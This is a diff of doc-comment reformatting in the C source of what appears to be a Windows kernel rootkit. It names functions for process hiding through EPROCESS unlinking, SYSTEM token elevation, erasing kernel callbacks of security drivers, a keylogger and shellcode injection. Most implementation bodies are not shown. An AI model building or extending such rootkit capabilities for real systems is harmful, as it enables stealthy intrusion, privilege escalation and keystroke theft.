@@ -27,13 +27,13 @@ NTSTATUS BeCmd_InjectionShellcode(_In_ ULONG Pid, _In_ PCWSTR FilePath);
 
 // --------------------------------------------------------------------------------------------------------
 
-/**
- * Method for setting the protection of an arbitrary process by PID.
+/*
+ * @brief Sets the protection of an arbitrary process by PID.
  *
- * @param[in] Pid PID of the target process
- * @param[in] NewProtectionLevel new level of protection to apply
- * 
- * @return NTSTATUS status code.
+ * @param[in] Pid PID of the target process.
+ * @param[in] NewProtectionLevel New level of protection to apply.
+ *
+ * @return NTSTATUS Status code.
  */
 NTSTATUS
 BeCmd_ProtectProcess(_In_ ULONG Pid, _In_ BYTE NewProtectionLevel)
@@ -62,11 +62,12 @@ BeCmd_ProtectProcess(_In_ ULONG Pid, _In_ BYTE NewProtectionLevel)
     return STATUS_SUCCESS;
 }
 
-/**
- * Sets target process access token to a SYSTEM token.
+/*
+ * @brief Sets the target process access token to a SYSTEM token.
  *
- * @param[in] pid PID of target process.
- * @return NTSTATUS status code.
+ * @param[in] Pid PID of the target process.
+ *
+ * @return NTSTATUS Status code.
  */
 NTSTATUS
 BeCmd_ElevateProcessAcessToken(_In_ HANDLE Pid)
@@ -112,12 +113,12 @@ BeCmd_ElevateProcessAcessToken(_In_ HANDLE Pid)
     return Status;
 }
 
-/**
- * Kills a process by PID.
+/*
+ * @brief Kills a process by PID.
  *
- * @param[in] Pid PID of the process to kill
- * 
- * @return NTSTATUS status code.
+ * @param[in] Pid PID of the process to kill.
+ *
+ * @return NTSTATUS Status code.
  */
 NTSTATUS
 BeCmd_KillProcess(_In_ HANDLE Pid)
@@ -145,12 +146,12 @@ BeCmd_KillProcess(_In_ HANDLE Pid)
     return Status;
 }
 
-/**
- * Hides a process by removing it from the linked list of active processes referenced in EPROCESS.
+/*
+ * @brief Hides a process by removing it from the linked list of active processes referenced in EPROCESS.
  *
- * @param[in] pid PID of target process.
- * 
- * @return NTSTATUS status code.
+ * @param[in] Pid PID of the target process.
+ *
+ * @return NTSTATUS Status code.
  */
 NTSTATUS
 BeCmd_HideProcess(_In_ HANDLE Pid)
@@ -169,12 +170,12 @@ BeCmd_HideProcess(_In_ HANDLE Pid)
     return STATUS_SUCCESS;
 }
 
-/**
- * Enumerates kernel callbacks
+/*
+ * @brief Enumerates kernel callbacks.
  *
- * @param[in] Type Type of callback to resolve
- * 
- * @returns ktd::vector<KernelCallback, PagedPool> Vector of callbacks
+ * @param[in] Type Type of callback to resolve.
+ *
+ * @returns ktd::vector<CALLBACK_DATA, PagedPool> Vector of callbacks.
  */
 ktd::vector<CALLBACK_DATA, PagedPool>
 BeCmd_EnumerateCallbacks(_In_ CALLBACK_TYPE type)
@@ -182,13 +183,13 @@ BeCmd_EnumerateCallbacks(_In_ CALLBACK_TYPE type)
     return BeEnumerateKernelCallbacks(type);
 }
 
-/**
- * Replaces all kernel callbacks of a specified driver with empty callbacks.
-
- * @param[in] TargetDriver Name of target driver
- * @param[in] CbType type of callback to remove
- * 
- * @return NTSTATUS status code.
+/*
+ * @brief Replaces all kernel callbacks of a specified driver with empty callbacks.
+ *
+ * @param[in] TargetDriver Name of the target driver.
+ * @param[in] CbType Type of callback to remove.
+ *
+ * @return NTSTATUS Status code.
  */
 NTSTATUS
 BeCmd_EraseCallbacks(_In_ PWCHAR TargetDriver, _In_ CALLBACK_TYPE CbType)
@@ -198,12 +199,12 @@ BeCmd_EraseCallbacks(_In_ PWCHAR TargetDriver, _In_ CALLBACK_TYPE CbType)
     return Status;
 }
 
-/**
- * Starts or stops the keylogger.
+/*
+ * @brief Starts or stops the keylogger.
  *
- * @param[in] Start TRUE to start, FALSE to stop
- * 
- * @return NTSTATUS status code.
+ * @param[in] Start TRUE to start, FALSE to stop.
+ *
+ * @return NTSTATUS Status code.
  */
 NTSTATUS
 BeCmd_StartKeylogger(_In_ BOOLEAN Start)
@@ -214,14 +215,13 @@ BeCmd_StartKeylogger(_In_ BOOLEAN Start)
     return STATUS_SUCCESS;
 }
 
-/**
- * @brief Inject Shellcode via ZwCreateThreadEx.
+/*
+ * @brief Injects shellcode via ZwCreateThreadEx.
  *
- * @param[in] Pid  The process ID of the target process.
- * @param[in] FilePath A pointer to a null-terminated wide string
- *                     containing the path to the shellcode file.
+ * @param[in] Pid The process ID of the target process.
+ * @param[in] FilePath A pointer to a null-terminated wide string containing the path to the shellcode file.
  *
- * @return NTSTATUS status code.
+ * @return NTSTATUS Status code.
  */
 NTSTATUS
 BeCmd_InjectionShellcode(
